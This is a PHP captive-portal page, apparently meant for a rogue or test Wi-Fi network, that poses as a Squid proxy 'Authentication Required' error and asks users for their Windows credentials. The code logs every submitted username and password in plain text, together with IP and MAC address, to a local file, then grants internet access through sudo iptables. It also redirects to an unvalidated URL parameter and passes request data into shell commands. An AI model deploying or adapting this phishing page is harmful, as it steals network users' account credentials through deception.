<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>

<?php
// Place in the root of the webserver directory

// Rename these Variables to conform with the target environment 
$server_name = "SERVER_NAME_REPLACE";
$domain_name = "DOMAIN_NAME_REPLACE";
$site_name = "SITE_NAME_REPLACE";
 
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// The following file is used to keep track of users
$users = "/var/lib/users";
 
// Check if we've been redirected by firewall to here.
// If so redirect to registration address
if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
  header("location:http://$server_name.$domain_name/index.php?add="
    .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
  exit;
}
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
if (!isset($mac)) { exit; }
 
$user = $_POST['user'];
 
if (empty($user)) {
//if ($code!="1234") {
  // code doesn’t equal expected value, so display form
  ?>


<body id="ERR_SHUTTING_DOWN">
<div id="titles">
<h1>Authentication Required</h1>
<h2>The requested URL could not be retrieved</h2>
</div>
<hr>
<div id="content">
<form method="post">
<p>The following error was encountered while trying to retrieve
the URL request.</p>To access the Internet, please logon
using your Windows Credentials.
<br><br>Username:<br>
<input name="user" type="text"><br>
Password:<br>
<input name="pass" type="password"><br>
<br>
<input name="submit" value="Submit" type="submit">
</div>
</form>
<hr>
<div id="footer">
<p>Generated by localhost (squid/3.1.19)</p>
</div>
</body>


  <?php
} else {
    enable_address();
}
 
// This function enables the PC on the system by calling iptables, and also saving the
// details in the users file for next time the firewall is reset
 
function enable_address() {
 
    global $user;
    global $pass;
    global $mac;
    global $users;
 

    file_put_contents($users,$_POST['user']."\t".$_POST['pass']."\t".$_SERVER['REMOTE_ADDR']."\t$mac\t".date("m.d.Y")."\n",FILE_APPEND + LOCK_EX);
    
    // Add PC to the firewall
    exec("sudo iptables -I internet 1 -t nat -m mac --mac-source $mac -j RETURN");
    // The following line removes connection tracking for the PC
    // This clears any previous (incorrect) route info for the redirection
    exec("sudo rmtrack ".$_SERVER['REMOTE_ADDR']);

    sleep(1);
    header("location:http://".$_GET['add']);
    exit;
}

// Function to print page header
function print_header() {

  ?>



<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>ERROR: The requested URL could not be retrieved</title>

<style type="text/css"><!-- /* Stylesheet for Squid Error pages
Adapted from design by Free CSS Templates
http://www.freecsstemplates.org
Released for free under a Creative Commons Attribution 2.5 License
*/
/* Page basics */
* {
font-family: verdana, sans-serif;
}
html body {
margin: 0;
padding: 0;
background: #efefef;
font-size: 12px;
color: #1e1e1e;
}
/* Page displayed title area */
#titles {
margin-left: 15px;
padding: 10px;
padding-left: 100px;
background: url('images/SN.png') no-repeat left;
}
/* initial title */
#titles h1 {
color: #000000;
}
#titles h2 {
color: #000000;
}
/* special event: FTP success page titles */
#titles ftpsuccess {
background-color:#00ff00;
width:100%;
}
/* Page displayed body content area */
#content {
padding: 10px;
background: #ffffff;
}
/* General text */
p {
}
/* error brief description */
#error p {
}
/* some data which may have caused the problem */
#data {
}
/* the error message received from the system or other software */
#sysmsg {
}
pre {
font-family:sans-serif;
}
/* special event: FTP / Gopher directory listing */
#dirmsg {
font-family: courier;
color: black;
font-size: 10pt;
}
#dirlisting {
margin-left: 2%;
margin-right: 2%;
}
#dirlisting tr.entry td.icon,td.filename,td.size,td.date {
border-bottom: groove;
}
#dirlisting td.size {
width: 50px;
text-align: right;
padding-right: 5px;
}
/* horizontal lines */
hr {
margin: 0;
}
/* page displayed footer area */
#footer {
font-size: 9px;
padding-left: 10px;
}
body :lang(fa) { direction: rtl; font-size: 100%; font-family: Tahoma, Roya, sans-serif; float: right; } :lang(he) { direction: rtl; } --></style>
</head>

  <?php
}

// Function to print page footer
function print_footer() {
  echo "</body>";
  echo "</html>";

}

?>
